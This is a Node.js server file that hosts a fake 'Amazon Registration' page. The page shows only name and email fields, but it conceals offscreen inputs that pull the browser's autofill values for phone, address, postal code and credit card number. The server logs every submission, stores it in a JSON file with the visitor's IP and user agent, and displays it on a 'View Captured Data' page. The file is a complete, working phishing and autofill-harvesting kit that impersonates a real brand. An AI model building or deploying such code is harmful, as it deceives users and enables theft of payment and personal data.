const http = require('http');
const fs = require('fs');
const url = require('url');
const querystring = require('querystring');

const PORT = 3000;
const DATA_FILE = 'captured_data.json';

// Initialize data file
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, '[]');
}

// HTML Form Template
const HTML_FORM = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Registration</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .hidden-fields {
            position: absolute;
            left: -9999px;
            opacity: 0;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
    </style>
</head>
<body class="bg-slate-100 flex items-center justify-center min-h-screen px-4">
    <div class="relative bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
    <!-- Amazon Logo -->
        <div class="flex justify-center mb-4">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" 
                alt="Amazon Logo" class="h-12">
        </div>
        <h1 class="text-3xl font-bold mb-2 text-center text-slate-800">Amazon Registration</h1>
        <p class="text-slate-500 text-center mb-8">Fill in your detail for Amazon Registration.</p>
        
        <form action="/submit" method="POST" class="space-y-6">
            <!-- FULL NAME -->
            <!-- FontAwesome CDN -->
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

            <div>
                <label for="username" class="block text-sm font-medium text-slate-700">Full Name</label>

                <div class="relative mt-1">
                    <!-- User/Profile Icon -->
                    <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-slate-400">
                        <i class="fa-solid fa-user"></i>
                    </span>

                    <input type="text" id="username" name="username" autocomplete="name" required
                        class="block w-full pl-10 px-3 py-2 bg-white border border-slate-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
            </div>


            <!-- EMAIL -->
            <!-- FontAwesome CDN -->
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

            <div>
                <label for="email" class="block text-sm font-medium text-slate-700">Email Address</label>

                <div class="relative mt-1">
                    <!-- Email Icon -->
                    <span class="absolute inset-y-0 left-0 pl-3 flex items-center text-slate-400">
                        <i class="fa-solid fa-envelope"></i>
                    </span>

                    <input type="email" id="email" name="email" autocomplete="email" required
                        class="block w-full pl-10 px-3 py-2 bg-white border border-slate-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-600">
                </div>
            </div>


            <!-- HIDDEN AUTOFILL FIELDS -->
            <div class="hidden-fields">
                <input type="text" id="phone" name="phone" autocomplete="tel">
                <input type="text" id="address" name="address" autocomplete="street-address">
                <input type="text" id="organization" name="organization" autocomplete="organization">
                <input type="text" id="cc-number" name="cc-number" autocomplete="cc-number">
                <input type="text" id="city" name="city" autocomplete="address-level2">
                <input type="text" id="state" name="state" autocomplete="address-level1">
                <input type="text" id="pincode" name="pincode" autocomplete="postal-code">
            </div>

            <!-- SUBMIT BUTTON -->
            <button type="submit"
                class="w-full py-3 px-4 bg-indigo-600 text-white rounded-md shadow-sm hover:bg-indigo-700">
                Submit
            </button>
        </form>
        
        <div class="mt-4 text-center">
            <a href="/view-data" class="text-indigo-600 hover:text-indigo-800 text-sm">View Captured Data</a>
        </div>
    </div>
</body>
</html>
`;

// Success Page
const SUCCESS_PAGE = `
<!DOCTYPE html>
<html>
<head>
    <title>Success</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-lg shadow-lg text-center">
        <div class="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
 <svg class="w-6 h-6 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
 </svg>
        </div>
        <h2 class="text-xl font-bold text-gray-900 mb-2">Registration Successful!</h2>
        <p class="text-gray-600 mb-4">Your data has been recorded successfully.</p>
        <a href="/" class="text-indigo-600 hover:text-indigo-800">Back to Form</a>
    </div>
</body>
</html>
`;

// Create server
const server = http.createServer((req, res) => {
    const parsedUrl = url.parse(req.url, true);
    const pathname = parsedUrl.pathname;
    
    console.log(`📨 Request: ${req.method} ${pathname}`);
    
    // Serve HTML Form
    if (pathname === '/' && req.method === 'GET') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(HTML_FORM);
        return;
    }
    
    // Handle form submission
    if (pathname === '/submit' && req.method === 'POST') {
        let body = '';
        
        req.on('data', chunk => {
            body += chunk.toString();
        });
        
        req.on('end', () => {
            const formData = querystring.parse(body);
            
            // Capture and save data
            const capturedData = {
                timestamp: new Date().toISOString(),
                ip: req.socket.remoteAddress,
                userAgent: req.headers['user-agent'],
                formData: formData
            };
            
            console.log('\x1b[32m📨 New Form Submission:\x1b[0m');
            console.log('Name:', capturedData.formData.username);
            console.log('Email:', capturedData.formData.email);
            console.log('Phone:', capturedData.formData.phone || 'Not captured');
            console.log('Address:', capturedData.formData.address || 'Not captured');
            console.log('Credit Card:', capturedData.formData['cc-number'] || 'Not captured');
            console.log('City:', capturedData.formData.city || 'Not captured');
            console.log('State:', capturedData.formData.state || 'Not captured');
            console.log('Pincode:', capturedData.formData.pincode || 'Not captured');
            console.log('---');
            
            // Save to file
            const existingData = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            existingData.push(capturedData);
            fs.writeFileSync(DATA_FILE, JSON.stringify(existingData, null, 2));
            
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(SUCCESS_PAGE);
        });
        return;
    }
    
    // View captured data
    if (pathname === '/view-data' && req.method === 'GET') {
        try {
            const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            
            let html = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>Captured Data</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: #0f172a; color: white; font-family: system-ui; }
                    .data-card { background: #1e293b; border: 1px solid #334155; }
                    .hidden-field { color: #ef4444; }
                </style>
            </head>
            <body class="p-6">
                <div class="max-w-6xl mx-auto">
                    <h1 class="text-3xl font-bold text-green-400 mb-2">Captured Form Data</h1>
                    <p class="text-red-400 mb-6"> ${data.length} submissions</p>
                    
                    <div class="mb-6">
                        <a href="/" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">Back to Form</a>
                    </div>
            `;
            
            if (data.length === 0) {
                html += `
                    <div class="data-card p-6 rounded-lg text-center">
                        <p class="text-gray-400">No data captured yet.</p>
                    </div>
                `;
            } else {
                data.forEach((entry, index) => {
                    html += `
                    <div class="data-card p-6 rounded-lg mb-4">
                        <div class="flex justify-between items-start mb-4">
                            <h3 class="text-lg font-semibold">Submission #${index + 1}</h3>
                            <span class="text-sm text-gray-400">${new Date(entry.timestamp).toLocaleString()}</span>
                        </div>
                        
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                            <div>
                                <p><strong class="text-blue-400">IP:</strong> ${entry.ip}</p>
                                <p><strong class="text-blue-400">User Agent:</strong></p>
                                <p class="text-xs text-gray-400 break-all">${entry.userAgent}</p>
                            </div>
                            <div class="space-y-1">
                                <p><strong class="text-green-400">Visible Fields:</strong></p>
                                <p><strong>Name:</strong> ${entry.formData.username || 'N/A'}</p>
                                <p><strong>Email:</strong> ${entry.formData.email || 'N/A'}</p>
                                
                                <p class="mt-2"><strong class="text-red-400">Hidden Autofill:</strong></p>
                                <p class="${entry.formData.phone ? 'hidden-field' : ''}"><strong>Phone:</strong> ${entry.formData.phone || 'N/A'}</p>
                                <p class="${entry.formData['cc-number'] ? 'hidden-field' : ''}"><strong>Credit Card:</strong> ${entry.formData['cc-number'] ? '****' + entry.formData['cc-number'].slice(-4) : 'N/A'}</p>
                                <p class="${entry.formData.address ? 'hidden-field' : ''}"><strong>Address:</strong> ${entry.formData.address || 'N/A'}</p>
                                <p class="${entry.formData.city ? 'hidden-field' : ''}"><strong>City:</strong> ${entry.formData.city || 'N/A'}</p>
                                <p class="${entry.formData.state ? 'hidden-field' : ''}"><strong>State:</strong> ${entry.formData.state || 'N/A'}</p>
                                <p class="${entry.formData.pincode ? 'hidden-field' : ''}"><strong>Pincode:</strong> ${entry.formData.pincode || 'N/A'}</p>
                                <p class="${entry.formData.organization ? 'hidden-field' : ''}"><strong>Organization:</strong> ${entry.formData.organization || 'N/A'}</p>
                            </div>
                        </div>
                    </div>
                    `;
                });
            }
            
            html += `</div></body></html>`;
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(html);
            
        } catch (error) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Error reading data');
        }
        return;
    }
    
    // 404 Not Found
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('404 Not Found');
});

// Start server
server.listen(PORT, () => {
    console.log('\x1b[32m🚀 Server running at http://localhost:3000\x1b[0m');
    console.log('\x1b[36m📊 View captured data at http://localhost:3000/view-data\x1b[0m');
});
